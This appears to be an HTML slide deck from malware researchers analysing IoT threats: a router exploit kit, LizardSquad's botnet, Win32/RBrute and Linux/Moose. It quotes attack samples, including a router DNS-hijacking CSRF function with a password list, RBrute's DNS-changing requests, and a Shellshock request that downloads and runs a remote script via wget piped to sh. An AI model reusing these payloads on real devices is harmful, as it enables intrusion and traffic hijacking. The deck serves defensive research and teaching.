@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><title>Internet of {Things,Threats}</title><meta content="yes" name="apple-mobile-web-app-capable" /><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui" name="viewport" /><link href="reveal.js/css/reveal.css" rel="stylesheet" /><link rel="stylesheet" href="reveal.js/css/theme/neutral.css" id="theme" /><link href="reveal.js/lib/css/zenburn.css" rel="stylesheet" /><script>document.write( '<link rel="stylesheet" href="reveal.js/css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );</script></head><body><div class="reveal"><div class="slides"><section data-background-size="contain" data-background-image="images/iot-hacker-lol_en.png" data-background-color="#000000"><h1>.</h1><p><small></small></p></section><section id="_iot_or_internet_of_things_threats"><h2>IoT or Internet of {Things,Threats}</h2><aside class="notes">but who are we?</aside></section>
+<section id="_thomas_nyx_o"><h2>Thomas (@nyx__o)</h2><div class="ulist"><ul><li><p>Malware Researcher at ESET <span class="image right"><img src="images/eset.png" alt="eset" width="300" /></span></p></li><li><p>CTF lover</p></li><li><p>Open source contributor</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>I&#8217;m Thomas, I&#8217;m Malware Researcher at ESET.</p></li><li><p>I spend some time to resolv some security challenges like CTF.</p></li><li><p>I also contribute to open source projects related to reverse engineering or malware.</p></li></ul></div></aside></section>
+<section id="_olivier_obilodeau"><h2>Olivier (@obilodeau)</h2><div class="ulist"><ul><li><p>Security Researcher at GoSecure <span class="image right"><img src="images/gosecure.png" alt="gosecure" width="300" /></span></p></li><li><p>Previously</p><div class="ulist"><ul><li><p>Malware Researcher at ESET</p></li><li><p>Infosec lecturer at ETS University in Montreal</p></li><li><p>Infosec developer, network admin, linux system admin</p></li></ul></div></li><li><p>Co-founder Montrehack (hands-on security workshops) <span class="image right"><img src="images/nsec.png" alt="nsec" width="150" /></span></p></li><li><p>VP Training and Hacker Jeopardy at NorthSec</p></li></ul></div></section>
+<section id="_agenda"><h2>Agenda</h2><div class="ulist"><ul><li><p>About IOT</p></li><li><p>Exploit Kit</p></li><li><p>LizardSquad</p></li><li><p>Win32/RBrute</p></li><li><p>Linux/Moose</p></li><li><p>Conclusion</p></li></ul></div>
+<aside class="notes"><div class="ulist"><div class="title">Our agenda:</div><ul><li><p>We will begin with an uncommon Exploit-Kit able to target home router.</p></li><li><p>Then we will take a look to a script kiddies botnet named LizardSquad.</p></li><li><p>Another part of our presentation will be on RBrute a windows malware that change DNS router.</p></li><li><p>And our last part Olivier will talk about Linux/Moose a strange animal that we tried to tame.</p></li><li><p>We will conclude and give some advice to avoid most of these issues.</p></li></ul></div></aside></section>
+<section><div class="imageblock" style=""><div class="content"><img src="images/0.png" alt="0" /></div></div>
+<aside class="notes"><div class="paragraph"><p>IoT are connected devices, beginning with connected stoves</p></div></aside></section>
+<section data-background-size="contain" data-background-image="images/1.png"><aside class="notes"><div class="paragraph"><p>To a bulb</p></div></aside></section>
+<section><div class="imageblock" style=""><div class="content"><img src="images/4.png" alt="4" /></div></div>
+<aside class="notes"><div class="paragraph"><p>A connected fridge</p></div></aside></section>
+<section><div class="imageblock" style=""><div class="content"><img src="images/3.png" alt="3" /></div></div>
+<aside class="notes"><div class="paragraph"><p>kettles that can leaks wifi passwords</p></div></aside></section>
+<section><div class="imageblock" style=""><div class="content"><img src="images/2.png" alt="2" /></div></div>
+<aside class="notes"><div class="paragraph"><p>Even other weird stuff</p></div></aside></section>
+<section id="_why_does_iot_security_matters" data-background="#000000"><h2>Why Does IoT Security Matters?</h2></section>
+<section id="_why_it_matters"><h2>Why It Matters?</h2><div class="ulist"><ul><li><p>Hard to detect</p></li><li><p>Hard to remediate</p></li><li><p>Hard to fix</p></li><li><p>Low hanging fruit for bad guys</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>detect: no AV, interacts w/ outside network</p></li><li><p>remediate: no shell</p></li><li><p>fix: no vendor updates</p></li><li><p>low hanging fruit: easy to build botnet and no one cares</p></li></ul></div></aside></section>
+<section id="_a_real_threat"><h2>A Real Threat</h2><div class="ulist"><ul><li><p>Several cases disclosed in the last few years</p></li><li><p>A lot of same-old background noise (DDoSer)</p></li><li><p>Things are only getting worse</p></li></ul></div></section>
+<section data-background="images/headline-incapsula.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>mass scale</p></li></ul></div></aside></section>
+<section data-background="images/headline-eset-rbrute.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>windows cross-infecting routers</p></li></ul></div></aside></section>
+<section data-background="images/headline-cisco.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>targetting Cisco</p></li></ul></div></aside></section>
+<section data-background="images/headline-eset-moose.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>some of ESET&#8217;s research</p></li></ul></div></aside></section>
+<section data-background="images/headline-remaiten.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>some more examples of ESET&#8217;s recent research</p></li></ul></div></aside></section>
+<section data-background="images/headline-bbc-reincarna.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>quelqu&#8217;un s&#8217;est même tanné et a décider de nettoyer tous les routeurs</p></li></ul></div></aside></section>
+<section data-background="images/headline-register-barbie.png" data-background-size="contain"><aside class="notes">and future targets</aside></section>
+<section id="_wait_is_iot_malware_really_about_things"><h2>Wait, is IoT malware really about things?</h2></section>
+<section id="_no_not_yet" data-background="#000000"><h2>No. Not yet.</h2><aside class="notes"><div class="ulist"><ul><li><p>Affected yes but collateral dammage</p></li><li><p>so what is affected?</p></li></ul></div></aside></section>
+<section data-background="images/lots-of-routers.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>ou mieux représentés par ce qu&#8217;ils valent en terme de sécurité</p></li></ul></div></aside></section>
+<section data-background="images/electronic-waste.jpg" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>mais on comprends, pression du marché, etc.</p></li><li><p>reste que la situation devra changer</p></li><li><p>une question de temps avant le IoT at large (si ça continue)</p></li></ul></div></aside></section>
+<section id="_so_what_kind_of_malware_can_we_find_on_such_insecure_devices"><h2>So what kind of malware can we find on such insecure devices?</h2></section>
+<section id="_exploit_kit_targeting_routers" data-background="#000000"><h2>Exploit Kit Targeting Routers</h2><aside class="notes"><div class="ulist"><ul><li><p>First, we have Exploit kit that targets embedded device.</p></li></ul></div></aside></section>
+<section id="_exploit_kit_definition"><h2>Exploit Kit Definition</h2><div class="ulist"><ul><li><p>Automate exploitation</p></li><li><p>Targets browsers</p></li><li><p>Common exploits are Adobe and Java</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Just a quick reminder, an EK are kits that aim to automatize the exploitation of vulnerability.</p></li><li><p>They target browsers like Chrome, Firefox, IE and plug-ins: Adobe Flash, Adobe Reader, Java.</p></li></ul></div></aside></section>
+<section><div class="paragraph"><p><span class="image"><img src="images/exploit-process.png" alt="exploit process" /></span></p></div>
+<div class="exampleblock small"><div class="content"><div class="paragraph"><p>source: Malwarebytes</p></div></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>But how an EK works.</p></li><li><p>For example we have a user browses a compromise website.</p></li><li><p>The EK will detect softwares version on the computer.</p></li><li><p>so what browser version, what plug-ins, what OS?</p></li><li><p>And If the software version corresponds to the operator requirement, it redirects the user using an iframe for example to the corresponding exploit and execute the malicious code without the user agreement.</p></li></ul></div></aside></section>
+<section id="_exploit_kit_in_action"><h2>Exploit Kit in Action</h2><div class="paragraph"><p><span class="image"><img src="images/kafeine.png" alt="kafeine" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Last year Kafeine, a blogger, wrote an article on the 1st EK targeting router.</p></li></ul></div></aside></section>
+<section id="_exploit_kit_in_action_cont"><h2>Exploit Kit in Action (cont.)</h2><div class="ulist"><ul><li><p>Cross-Site Request Forgery (CSRF)</p></li><li><p>Uses default credential (HTTP)</p></li><li><p>Changes primary Domain Name System (DNS)</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>What this EK works, it uses CSRF</p></li><li><p>with default credentials,</p></li><li><p>and execute code through HTML page.</p></li><li><p>What CSRF looks like?</p></li></ul></div></aside></section>
+<section id="_exploit_kit_csrf"><h2>Exploit Kit CSRF</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>&lt;html&gt;&lt;head&gt;&lt;script type="text/javascript" src="e_x.js"&gt;&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe id="iframe" sandbox="allow-same-origin" style="display: none"&gt;&lt;/iframe&gt;
+&lt;script language="javascript"&gt;
+var pDNS = "37.139.50.45";
+var sDNS = "8.8.8.8";
+var passlist=["123456789","root","admin","qwerty","123456789","baseball","football","monkey","letmein","abc123","tata","&lt;eopl&gt;"];</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Here a snippet of config code used.</p></li><li><p>It defines the primary DNS (malicious).</p></li><li><p>The secondary DNS is the public Google DNS.</p></li><li><p>This one is used in order to stay under the radar in case of the primary DNS doesn&#8217;t answer.</p></li><li><p>Finally the passord list that will be used to bruteforce the router form.</p></li></ul></div></aside></section>
+<section id="_exploit_kit_how_to"><h2>Exploit Kit How-To</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>function e_belkin(ip){
+    var method = "POST";
+    var url = "";
+    var data ="";
+    url="http://"+ip+"/cgi-bin/login.exe?pws=admin";
+    exp(url, "", "GET");
+    url="http://"+ip+"/cgi-bin/setup_dns.exe";
+    data="dns1_1="+pDNS.split('.')[0]+"&amp;dns1_2="+pDNS.split('.')[1]+"&amp;dns1_3="+pDNS.split('.')[2]+"&amp;dns1_4="+pDNS.split('.')[3]+"&amp;dns2_1="+sDNS.split('.')[0]+"&amp;dns2_2="+sDNS.split('.')[1]+"dns2_3="+sDNS.split('.')[2]+"&amp;dns2_4="+sDNS.split('.')[3]+"&amp;dns2_1_t="+sDNS.split('.')[0]+"&amp;dns2_2_t="+sDNS.split('.')[1]+"dns2_3_t="+sDNS.split('.')[2]+"&amp;dns2_4_t="+sDNS.split('.')[3]+"&amp;auto_from_isp=0";
+    exp(url, data, method);
+}</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>This snippet is the payload part</p></li><li><p>it grabs variables that are in the previous slide</p></li><li><p>and do its CSRF</p></li><li><p>as you can see this function is used for belkin model</p></li><li><p>according the models the CSRF gonna change and login too</p></li></ul></div></aside></section>
+<section id="_exploit_kit_continually_improved"><h2>Exploit Kit continually improved</h2><div class="ulist"><ul><li><p>Obfuscation</p></li><li><p>Exploits for CVEs</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>But a time comes when this is too easy to detect</p></li><li><p>author improved their EK with obfuscation and adding new exploits</p></li><li><p>The obfuscation allows to produce a code hard to read and to understand.</p></li><li><p>For instance it can rename variables by letters and numbers without any signifiaction.</p></li><li><p>Another possibility is to use a decrypting routine.</p></li></ul></div></aside></section>
+<section id="_exploit_kit_cve"><h2>Exploit Kit - CVE</h2><div class="ulist"><ul><li><p>CVE-2015-1187</p></li><li><p>D-Link DIR-636L</p></li><li><p>Remote Command Injection</p></li><li><p>Incorrect Authentication</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>The other improvement is new exploits implementations.</p></li><li><p>One of the exploits added in the EK target the CVE-2015-1187, that affect some Dlink brand model.</p></li><li><p>It allows to inject arbitrary commands into the router.</p></li><li><p>Other exploits target old CVE like the CVE-2008-1244. THIS CVE IS 7 YEARS OLD</p></li><li><p>If the operator took times to implement the exploit targeting this bug, we can think that works pretty well.</p></li><li><p>A CVE is a known vulnerability, documented and had a specific number.</p></li></ul></div></aside></section>
+<section id="_recap"><h2>Recap</h2><div class="ulist"><ul><li><p>Exploit Kit</p></li><li><p>Change DNS</p></li><li><p>Fileless</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>So now what do we have?</p></li><li><p>We have an EK that change the DNS router, fileless, crossplatforms.</p></li><li><p>What can they do?</p></li></ul></div></aside></section>
+<section id="_what_can_they_do"><h2>What Can They Do?</h2><div class="ulist"><ul><li><p>Universal XSS on all HTTP sites fetching Javascript on a 3rd party domain</p></li><li><p>Phishing</p></li><li><p>Adfraud</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>All resources that the browser get in HTTP can potentially be replaced by the operator.</p></li><li><p>Generally it end with: phishing, adfraud.</p></li><li><p>And what Javascript script from a 3rd party do you think is the most popular?</p></li></ul></div></aside></section>
+<section id="_you_said_adfraud"><h2>You Said Adfraud?</h2><div class="ulist"><ul><li><p>Injection via Google Analytics domain hijacking</p></li><li><p>Javascript runs in context of every page</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>The answer is Google Analytics.</p></li><li><p>For instance, the injection through Google Analytics domain hijacking.</p></li><li><p>So let&#8217;s say we have a webpage that contains Javascript that got Google Analytics.</p></li><li><p>This Javascript is replaced by malicious javascript.</p></li><li><p>In that case it can inject iframes in ads or replaces legitimate ads by ads that belong to the operator.</p></li></ul></div>
+<div class="ulist"><ul><li><p>Le javascript des pages qui ont du Google analytics est remplacé par du Javascript malicieux</p></li><li><p>En l&#8217;occurence injecter des iframes dans des pubs ou remplacer des pubs existantes par des pubs qui lui rapporte</p></li></ul></div></aside></section>
+<section id="_exemple_of_google_analytics_substitution"><h2>Exemple of Google Analytics Substitution</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>'adcash': function() {
+    var adcash = document.createElement('script');
+    adcash.type = 'text/javascript';
+    adcash.src = 'http://www.adcash.com/script/java.php?option=rotateur&amp;r=274944';
+    document.body.appendChild(adcash);
+},</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>This snippet allows to the operator to adds 3rd party&#8217;s Javascript.</p></li><li><p>Here adcash is added</p></li><li><p>Par exemple cette fonction lui permet de rajouter le javascript d&#8217;un tiers.</p></li></ul></div></aside></section>
+<section id="_lizardsquad" data-background="#000000"><h2>LizardSquad</h2></section>
+<section data-background="images/lizardsquad.jpeg" data-background-size="contain"></section>
+<section id="_who_are_lizardsquad"><h2>Who are LizardSquad?</h2><div class="ulist"><ul><li><p>Black hat hacking group</p></li><li><p>Lots of Distributed Denial of Service (DDoS)</p></li><li><p>DDoS PlayStation Network and Xbox live in Christmas 2014</p></li><li><p>Bomb threats</p></li><li><p>DDoS for hire (LizardStresser)</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>6 of them were arrested in August</p></li></ul></div></aside></section>
+<section id="_cyber_rascals" data-background="#000000"><h2>CYBER-RASCALS!</h2></section>
+<section data-background="images/headline-krebs.png" data-background-size="contain"></section>
+<section id="_the_malware"><h2>The Malware</h2><div class="ulist"><ul><li><p>Linux/Gafgyt</p></li><li><p>Linux/Powbot, Linux/Aidra, Kaiten, &#8230;&#8203;</p></li><li><p>Probably others, as source is public</p></li></ul></div></section>
+<section id="_caracteristics"><h2>Caracteristics</h2><div class="ulist"><ul><li><p>Telnet scanner</p></li><li><p>Flooding: UDP, TCP, Junk and Hold</p></li><li><p>Multiple architectures: SuperH, MIPS, ARM, x86, PowerPC, &#8230;&#8203;</p></li></ul></div></section>
+<section id="_some_server_code"><h2>Some Server Code</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code class="C language-C">"*****************************************"
+"*        WELCOME TO THE BALL PIT        *"
+"*     Now with *refrigerator* support   *"
+"*****************************************"</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>with refrigerator support ;)</p></li></ul></div></aside></section>
+<section id="_attack_vectors"><h2>Attack Vectors</h2><div class="ulist"><ul><li><p>Shellshock</p></li><li><p>SSH credentials brute-force</p></li><li><p>Telnet credentials brute-force</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>bruteforce avec une courte liste de weak pass</p></li></ul></div></aside></section>
+<section id="_exemple_of_shellshock_attempt"><h2>Exemple of Shellshock Attempt</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>GET /cgi-bin/authLogin.cgi HTTP/1.1
+Host: 127.0.0.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+User-Agent: () { goo;}; wget -qO - http://o.kei.su/qn | sh &gt; /dev/null 2&gt;&amp;1 &amp;</code></pre></div></div></section>
+<section id="_other_variants"><h2>Other Variants</h2><div class="ulist"><ul><li><p>HTTPS support</p></li><li><p>CloudFlare protection bypass</p></li></ul></div></section>
+<section data-background="images/cloudflare.png" data-background-size="contain"></section>
+<section id="_sophisticated"><h2>Sophisticated?</h2><div class="ulist"><ul><li><p>LizardStresser database was leaked</p></li><li><p>Passwords in plaintext&#8230;&#8203;</p></li></ul></div></section>
+<section id="_irc_command_and_control"><h2>IRC Command and Control</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>------- Day changed to 08/25/15 -------
+09:32  -!- There are 0 users and 2085 invisible on 1 servers
+09:32  -!- 42 unknown connection(s)
+09:32  -!- 3 channels formed
+09:32  -!- I have 2085 clients and 0 servers
+09:32  -!- 2085 2119 Current local users 2085, max 2119
+09:32  -!- 2085 2119 Current global users 2085, max 2119</code></pre></div></div></section>
+<section id="_bot_masters"><h2>Bot Masters</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>12:56  -!- Topic for #Fazzix: 1k
+12:56  -!- Topic set by void &lt;&gt; (Wed Aug 19 09:58:45 2015)
+12:56 [Users #Fazzix]
+12:56 [~void] [~void_] [@bob1k] [@Fazzix] [ Myutro]·
+12:56  -!- Irssi: #Fazzix: Total of 5 nicks (4 ops, 0 halfops, 0 voices, 1 normal)
+12:56  -!- Channel #Fazzix created Mon Aug 17 03:11:29 2015
+12:56  -!- Irssi: Join to #Fazzix was synced in 2 secs</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>mostly gamer-related targets: DSLs, game hosting companies, &#8230;&#8203;</p></li></ul></div></aside></section>
+<section><div class="paragraph"><p><span class="image"><img src="images/cyber-chenapans-tweets_02.png" alt="cyber chenapans tweets 02" /></span> <span class="image"><img src="images/cyber-chenapans-tweets_01.png" alt="cyber chenapans tweets 01" /></span></p></div></section>
+<section data-background="images/rbrute.png" data-background-size="contain"><aside class="notes"><div class="ulist"><ul><li><p>At the end of 2013 and beginning of 2014 our colleague Benjamin found a new component of Sality, Rbrute.</p></li><li><p>Quick reminder, Sality is a P2P botnet that mainly sends spam.</p></li><li><p>This new component brings to the botnet a new attack vector using router infection.</p></li><li><p>The final purpose is to infect the victim computer with the botnet.</p></li></ul></div></aside></section>
+<section id="_win32_rbrute_cont"><h2>Win32/RBrute (cont.)</h2><div class="ulist"><ul><li><p>Tries to find administration web pages (IP)</p></li><li><p>Scan and report</p></li><li><p>Router model is extracted from the realm attribute of the HTTP authentication</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>So how it works, first RBrute retrieves from the CnC a list of IP to scan.</p></li><li><p>It scans these IP report its findings.</p></li><li><p>Adds the router model.</p></li></ul></div></aside></section>
+<section id="_win32_rbrute_targets"><h2>Win32/RBrute Targets</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="shell language-shell">$ strings rbrute.exe
+[...]
+TD-W8901G
+TD-W8901GB
+TD-W8951ND
+TD-W8961ND
+TD-8840T
+TD-W8961ND
+TD-8816
+TD-8817
+TD-W8151N
+TD-W8101G
+ZXDSL 831CII
+ZXV10 W300
+[...]
+DSL-2520U
+DSL-2600U
+DSL router
+TD-W8901G
+TD-W8901G 3.0
+TD-W8901GB
+TD-W8951ND
+TD-W8961ND
+TD-8840T
+TD-8840T 2.0
+TD-W8961ND
+TD-8816
+TD-8817 2.0
+TD-8817
+TD-W8151N
+TD-W8101G
+ZXDSL 831CII
+[...]</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>here is a non exhaustive list of supported router models</p></li><li><p>This list is in the binary</p></li><li><p>So we can see Dlink, TPlink, ZTE</p></li></ul></div></aside></section>
+<section id="_win32_rbrute_bruteforce"><h2>Win32/RBrute Bruteforce</h2><div class="ulist"><ul><li><p>Logins: <code>admin</code>, <code>support</code>, <code>root</code> &amp; <code>Administrator</code></p></li><li><p>Password list retrieved from the CnC</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>&lt;empty string&gt;
+111111
+12345
+123456
+12345678
+abc123
+admin
+Administrator
+consumer
+dragon
+gizmodo
+iqrquksm
+letmein
+lifehack
+monkey
+password
+qwerty
+root
+soporteETB2006
+support
+tadpassword
+trustno1
+we0Qilhxtx4yLGZPhokY</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>We also have the logins used for the bruteforce inside the binary</p></li><li><p>Once the report sent, the CnC answers with a password list.</p></li><li><p>With the logins list, it bruteforces the router authentication form.</p></li></ul></div></aside></section>
+<section id="_win32_rbrute_changing_dns"><h2>Win32/RBrute Changing DNS</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>http://&lt;router_IP&gt;/&amp;dnsserver=&lt;malicious_DNS&gt;&amp;dnsserver2=8.8.8.8&amp;Save=Save
+http://&lt;router_IP&gt;/dnscfg.cgi?dnsPrimary=&lt;malicious_DNS&gt;&amp;dnsSecondary=8.8.8.8&amp;dnsDynamic=0&amp;dnsRefresh=1
+http://&lt;router_IP&gt;/Enable_DNSFollowing=1&amp;dnsPrimary=&lt;malicious_DNS&gt;&amp;dnsSecondary=8.8.8.8</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Finally, it uses CSRF to modify the primary and secondary DNS.</p></li><li><p>Requests are quite explicit as we can see.</p></li></ul></div></aside></section>
+<section id="_win32_rbrute_next_step"><h2>Win32/RBrute Next Step</h2><div class="ulist"><ul><li><p>Simple redirection to fake Chrome installer (facebook or google domains)</p></li><li><p>Install (user action required)</p></li><li><p>Change primary DNS on the computer (via key registry)</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>HKLM/SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/{network interface UUID}/NameServer = “8.8.8.8”</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Once the DNS changed</p></li><li><p>each time a user wants to browse a specific website it will be redirected to a webpage that download a fake Chrome Installer.</p></li><li><p>The installation requires the user action.</p></li><li><p>After the installation Sality change Windows DNS through the registry key.</p></li></ul></div></aside></section>
+<section id="_why_reinfect_someone_by_rbrute_and_not_sality"><h2>Why reinfect someone by RBrute and not Sality?</h2><aside class="notes"><div class="paragraph"><p>Why the operator wants to infect an user with RBrute, then Sality instead of Sality directly.</p></div></aside></section>
+<section id="_win32_rbrute_in_a_coffee_shop"><h2>Win32/RBrute In A Coffee Shop</h2><div class="ulist"><ul><li><p>Infected user</p></li><li><p>Infected router</p></li><li><p>Everyone is infected</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Think about it, a user in a coffee shop.</p></li><li><p>He connects its laptop to the WIFI.</p></li><li><p>He is infected by RBrute.</p></li><li><p>RBrute change the DNS router.</p></li><li><p>Finally all users using the WIFI can be redirected and infected.</p></li><li><p>This is a case that allows Sality&#8217;s authors to infect end users that they could not have.</p></li></ul></div></aside></section>
+<section id="_rbrute_and_sality"><h2>RBrute and Sality</h2><div class="paragraph"><p><span class="image"><img src="images/sality_overall.png" alt="sality overall" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>This schema shows us the number rate of Sality detection.</p></li><li><p>The December spike represent RBrute release.</p></li><li><p>Keep in mind that the attack, the bruteforce is quite smooth 4logins 10psswd.</p></li><li><p>The last example that olivier gonna talk about is more agressive.</p></li></ul></div></aside></section>
+<section data-background-size="contain" data-background-image="images/moose-warning.jpg"><aside class="notes"><div class="paragraph"><p>warning: lots of Moose references ahead</p></div></aside></section>
+<section id="_linux_moose" data-background="#000000"><h2>Linux/Moose</h2></section>
+<section id="_linux_moose_2"><h2>Linux/Moose</h2><div class="ulist"><ul><li><p>November 2014: Discovered by ESET <span class="image right"><img src="images/moose-paper-cover.png" alt="moose paper cover" width="300" /></span></p></li><li><p>Early 2015: Thoroughly reverse-engineered</p></li><li><p>May 2015: Paper published</p></li></ul></div></section>
+<section id="_moose_dna"><h2>Moose DNA</h2><div class="paragraph"><p>aka Malware description</p></div>
+<div class="paragraph small"><small>Hang tight, this is a recap</small></div>
+<aside class="notes"><div class="paragraph"><p>gory details all in the report</p></div></aside></section>
+<section id="_linux_moose_3"><h2>Linux/Moose&#8230;&#8203;</h2><div class="paragraph"><p>Named after the string "elan" present in the malware executable</p></div>
+<div class="paragraph"><p><span class="image"><img src="images/elan-strings.png" alt="elan strings" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>Lets get this out of the way.</p></div>
+<div class="paragraph"><p>Elan2 is the file that is downloaded when the malware successfully spreads</p></div></aside></section>
+<section id="_elan"><h2>Elan&#8230;&#8203;?</h2><div class="paragraph"><p><span class="image"><img src="images/moose-silly.jpg" alt="moose silly" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>Moose, thus Linux/Moose was born</p></div>
+<div class="paragraph"><p>But after the release of the whitepaper the Internet did some crowd-sourcing</p></div></aside></section>
+<section id="_the_lotus_elan"><h2>The Lotus Elan</h2><div class="paragraph"><p><span class="image"><img src="images/lotus-elan.jpg" alt="lotus elan" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>And maybe the malware authors were nostalgic of the Lotus Elan</p></div>
+<div class="paragraph"><p>or fan of a famous rock band near here&#8230;&#8203;</p></div></aside></section>
+<section id="_elán"><h2>Elán</h2><div class="paragraph"><p>The Slovak rock band (from 1969 and still active)</p></div></section>
+<section data-background-size="contain" data-background-image="images/Elan-slovak-rock-band.jpg"><aside class="notes">thanks Robert Lipovski for this less obvious
+reference for a Canadian</aside></section>
+<section id="_network_capabilities"><h2>Network Capabilities</h2><div class="ulist"><ul><li><p>Pivot through firewalls</p></li><li><p>Home-made NAT traversal</p></li><li><p>Custom-made Proxy service</p><div class="ulist"><ul><li><p>only available to a set of whitelisted IP addresses</p></li></ul></div></li><li><p>Remotely configured generic network sniffer</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>more serious note</p></div>
+<div class="ulist"><ul><li><p>Via infected routers</p></li><li><p>None</p></li><li><p>Supporting both SOCKS and HTTP Proxying, listening on port 10073</p></li><li><p>Configured by the C&amp;C server, sniff on all non /32 and non loopback interfaces</p></li></ul></div></aside></section>
+<section data-background-size="contain" data-background-image="images/moose-scanner-threads.png"><aside class="notes"><div class="ulist"><div class="title">Worm-like behavior</div><ul><li><p>Tries to replicate via aggressive scanning</p></li><li><p>Will dedicate more resources to scan near current external IP</p></li><li><p>Will also scan on LAN interfaces</p></li><li><p>Will not reinfect an infected device</p></li><li><p>Can replicate across architectures</p></li><li><p>C&amp;C is made aware of new compromises</p></li><li><p>Scans the internet on port 10073 (then 23), witnessed up to 35 threads
+dedicated to scanning</p></li><li><p>MIPS and ARM</p></li><li><p>As you’ll see in the next diagram</p></li></ul></div></aside></section>
+<section id="_attack_vector"><h2>Attack Vector</h2><div class="ulist"><ul><li><p>Telnet credentials bruteforce</p></li><li><p>Wordlist of 304 user/pass entries sent by server</p></li></ul></div></section>
+<section id="_compromise_protocol"><h2>Compromise Protocol</h2><div class="paragraph"><p><span class="image"><img src="images/moose-infection-process.png" alt="moose infection process" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>C&amp;C is active during a compromise.</p></div>
+<div class="ulist"><div class="title">Advantages:</div><ul><li><p>specific binary for arch</p></li><li><p>can gather add. data</p></li></ul></div>
+<div class="ulist"><div class="title">Disadvantage:</div><ul><li><p>If C&amp;C is down, no further compromises happen</p></li></ul></div>
+<div class="paragraph"><p>It spreads by finding routers (or devices) with weak or default credentials.</p></div></aside></section>
+<section id="_anti_analysis"><h2>Anti-Analysis</h2><div class="ulist"><ul><li><p>Statically linked binary stripped of its debugging symbols</p></li><li><p>Hard to reproduce environment required for malware to operate</p></li><li><p>Misleading strings (getcool.com)</p></li><li><p>No x86 variant!</p></li></ul></div>
+<aside class="notes"><div class="ulist"><div class="title">Packing several tricks</div><ul><li><p>Makes reverse-engineering tedious as the C library is mixed with malware code.</p></li><li><p>VM was not enough, for best results, we needed to be reachable from the Internet</p></li><li><p>Misleading strings resulted in bad domain takedown attempts by some</p></li><li><p>Harder to reverse engineer</p></li></ul></div></aside></section>
+<section data-background-size="contain" data-background-image="images/moose-components.png"><aside class="notes">in overview</aside></section>
+<section id="_moose_herding"><h2>Moose Herding</h2><div class="paragraph"><p>The Malware Operation</p></div>
+<aside class="notes"><div class="paragraph"><p>broad espionage and infiltration capability, what did they used it for?</p></div></aside></section>
+<section id="_via_c_c_configuration"><h2>Via C&amp;C Configuration</h2><div class="ulist"><ul><li><p>Network sniffer was used to steal HTTP Cookies</p><div class="ulist"><ul><li><p>Twitter: <code>twll</code>, <code>twid</code></p></li><li><p>Facebook: <code>c_user</code></p></li><li><p>Instagram: <code>ds_user_id</code></p></li><li><p>Google: <code>SAPISID</code>, <code>APISID</code></p></li><li><p>Google Play / Android: <code>LAY_ACTIVE_ACCOUNT</code></p></li><li><p>Youtube: <code>LOGIN_INFO</code></p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>The network sniffer was configured to steal cookies</p></li><li><p>Although the effectiveness of that approach is really debatable</p></li></ul></div></aside></section>
+<section id="_via_proxy_usage_analysis"><h2>Via Proxy Usage Analysis</h2><div class="ulist"><ul><li><p>Targeted social networks</p></li></ul></div></section>
